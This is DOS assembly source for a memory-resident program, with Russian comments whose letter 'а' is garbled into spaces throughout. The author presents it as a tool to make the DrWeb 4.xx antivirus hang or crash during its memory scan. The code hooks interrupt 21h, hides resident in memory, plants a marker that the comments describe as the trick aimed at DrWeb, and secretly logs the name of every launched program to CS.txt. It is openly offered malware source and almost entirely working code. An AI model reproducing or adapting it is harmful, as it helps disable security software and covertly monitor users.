;М леньк я прогр мк  для сбр сыв ния DrWeb'a 4.xx
;  при проверке п мяти в DOS виснет, в Windows прогр мм  выполнил 
;  недопустимую опер цию...
;  С м  прогр мм  производит отслежив ние з пуск имых прогр мм с з писью имен
;  в ф йл, т.е. вирус по функциям :) но без з р жения...
;
;                                       CyberShadow//SMF
.model tiny
.code
.386
const1  equ offset end_v-offset start
const2  equ (offset end_v-offset start+100h)/16+1
        org 100h
start:
        push cs
        pop ds
        mov ax,3521h
        int 21h
        mov cs:[old_i],bx
        mov cs:[old_i+2],es
        cmp word ptr es:[bx+2],'SC'
        je Exit_inst
        mov bp,cs
        mov ax,bp
        dec ax
        mov ds,ax
        xor di,di
        xchg [di+3],bx
        sub bx,const2+1
        mov [di+3],bx
        add bx,bp
        mov es,bx
        mov al,[di]
        push di
        stosb
        mov byte ptr [di-1],4dh
        mov ax,70h
        stosw
        mov ax,const2
        stosw
        pop di
        inc bx
        mov es,bx
        mov cx,const1
        push cs
        pop ds
        mov si,100h
        mov di,si
        cld
        rep movsb
        push es
        pop ds
        mov dx,offset new_21
        mov ax,2521h
        int 21h
Exit_inst:
        mov ax,4ch
        int 21h
new_21:
        jmp short new_21_
        db 'CS'
new_21_:
        push ax bx cx dx         ;Собссно подъебон для DrWeb!
        cmp ah,4ch
        pop dx cx bx ax
        je my_21h
old_21h:
        db 0eah
old_i   dw 0,0
old_21h_:
        pushf
        call dword ptr cs:[old_i]
        ret
my_21h:
        pusha
        push ds es
        mov ax,5d06h
        call old_21h_
        mov es,ds:[si+10h]
        mov ds,es:[2ch]
        xor si,si
        dec si
find:
        inc si
        cmp dword ptr ds:[si],00010000h
        jne find
        add si,4
        push cs
        pop es
        mov di,offset file
        mov cx,2
save1:
        lodsb
        or al,al
        je save2
        inc cx
        stosb
        jmp save1
save2:
        mov ax,0a0dh
        stosw
        push cx
        mov dx,offset my_f
        push cs
        pop ds
        mov ax,3d02h
        call old_21h_
        jnc OpenFileOk
        xor cx,cx
        mov dx,offset my_f
        mov ah,3ch
        int 21h
OpenFileOk:
        xchg bx,ax
        xor cx,cx
        xor dx,dx
        mov ax,4202h
        call old_21h_
        pop cx
        mov ah,40h
        mov dx,offset file
        call old_21h_
        mov ah,3eh
        call old_21h_
        pop es ds
        popa
        jmp old_21h
my_f    db 'CS.txt',0
file    db 128 dup (0)
end_v:
end start
